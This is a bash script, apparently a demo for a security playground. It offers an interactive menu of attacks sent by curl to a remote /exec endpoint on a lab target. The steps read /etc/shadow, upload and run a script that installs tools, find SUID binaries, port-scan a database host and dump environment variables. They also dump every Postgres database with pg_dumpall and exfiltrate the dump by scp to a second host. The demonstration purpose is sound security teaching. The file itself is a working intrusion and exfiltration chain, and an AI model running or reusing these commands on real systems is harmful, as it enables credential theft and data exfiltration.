#!/bin/bash

read -p "What is the http address of your target? [http://192.168.1.59]: "  sec_playground_url
sec_playground_url=${sec_playground_url:-http://192.168.1.59}

function read_sensitive_file() {
    echo "********************************************************************************"
    echo ""
	echo "Reading /etc/shadow from remote service... "
    echo "The following curl command is about to be run, press any key to continue..."
    echo "Command: curl ${sec_playground_url}/etc/shadow"
    echo ""
    echo "Press any key to continue..."
    read
    echo "--------------------------------------------------------------------------------"
	curl ${sec_playground_url}/etc/shadow
	echo "********************************************************************************"
}

function upload_file() {
    echo "********************************************************************************"
    echo ""
	echo "Uploading file to /tmp/ "
    echo "The following curl command is about to be run, press any key to continue..."
    echo "Command: curl -X POST ${sec_playground_url}/tmp/bad_script.sh -d 'content=apk add nmap openssh'"
    echo ""
    echo "Press any key to continue..."
    read
    echo "--------------------------------------------------------------------------------"
	curl -X POST ${sec_playground_url}/tmp/bad_script.sh -d content="apk add nmap openssh"
    echo ""
	echo "********************************************************************************"
}

function exec_bad_script() {
    echo "********************************************************************************"
	echo "Installing nmap and scp in remote contianer... "
    echo "The following curl command is about to be run, press any key to continue..."
    echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=sh /tmp/bad_script.sh'"
    echo ""
    echo "Press any key to continue..."
    read
    echo "--------------------------------------------------------------------------------"
	curl -X POST ${sec_playground_url}/exec -d 'command=sh /tmp/bad_script.sh'
    echo "********************************************************************************"
}

function find_suid_binaries() {
    echo "********************************************************************************"
	echo "Find SUID Binaries... "
    echo "The following curl command is about to be run, press any key to continue..."
    echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=find / -perm -u=s -type f 2>/dev/null'"
    echo ""
    echo "Press any key to continue..."
    read
    echo "--------------------------------------------------------------------------------"
	curl -X POST ${sec_playground_url}/exec -d 'command=find / -perm -u=s -type f 2>/dev/null'
    echo "********************************************************************************"
}


function port_scan() {
    echo "********************************************************************************"
	echo "Run Port Scan... "
    echo "The following curl command is about to be run:"
    echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=nmap -Pn -p 5432 appdb'"
    echo ""
    echo "Press any key to continue..."
    read
    echo "--------------------------------------------------------------------------------"
	curl -X POST ${sec_playground_url}/exec -d 'command=nmap -Pn -p 5432 appdb'
    echo "********************************************************************************"
}

function dump_env_var() {
    echo "********************************************************************************"
	echo "Dump Environment Variables... "
    echo "The following curl command is about to be run, press any key to continue..."
    echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=printenv'"
    echo ""
    echo "Press any key to continue..."
    read
    echo "--------------------------------------------------------------------------------"
	curl -X POST ${sec_playground_url}/exec -d 'command=printenv'
    echo "********************************************************************************"
}

function install_psql_tools() {
    echo "********************************************************************************"
	echo "Install PSQL Tools... "
    echo "The following curl command is about to be run, press any key to continue..."
    echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=apk add postgresql-client'"
    echo ""
    echo "Press any key to continue..."
    read
    echo "--------------------------------------------------------------------------------"
	curl -X POST ${sec_playground_url}/exec -d 'command=apk add postgresql-client'
    echo "********************************************************************************"
}

function dump_db() {
    echo "********************************************************************************"
	echo "Dump all Databases... "
    echo "The following curl command is about to be run, press any key to continue..."
    echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=pg_dumpall -f /tmp/db_dump.tar;ls -la /tmp/''"
    echo ""
    echo "Press any key to continue..."
    read
    echo "--------------------------------------------------------------------------------"
	curl -X POST ${sec_playground_url}/exec -d 'command=pg_dumpall -f /tmp/db_dump.tar;ls -la /tmp/'
    echo "********************************************************************************"
}

function exfiltrate_data() {
    echo "********************************************************************************"
	echo "Exfiltrate Data... "
    echo "The following curl command is about to be run, press any key to continue..."
    echo "Command: curl -X POST ${sec_playground_url}/exec -d 'command=scp -r /tmp/db_dump.tar test@192.168.1.51:/tmp/db_dump.tar'"
    echo ""
    echo "Press any key to continue..."
    read
	echo "--------------------------------------------------------------------------------"
    curl -X POST ${sec_playground_url}/exec -d 'command=scp -r /tmp/db_dump.tar test@192.168.1.51:/tmp/db_dump.tar'
    echo "********************************************************************************"
}


menu(){
echo -ne "
********************************************************************************
Select an Exploit:
1) Read Sensitive File
2) Write script to /tmp
3) Exec bad script
4) Run Port Scan
5) Dump Environment Variables
6) Install PSQL Tools
7) Dump DB
8) Exfiltrate Data
0) Exit
Choose an option: "
        read a
        case $a in
	        1) read_sensitive_file ; menu ;;
            2) upload_file ; menu ;;
            3) exec_bad_script ; menu ;;
	        4) port_scan ; menu ;;
            5) dump_env_var ; menu ;;
            6) install_psql_tools ; menu ;;
            7) dump_db ; menu ;;
            8) exfiltrate_data ; menu ;;
		0) exit 0 ;;
        esac
}

# Call the menu function
menu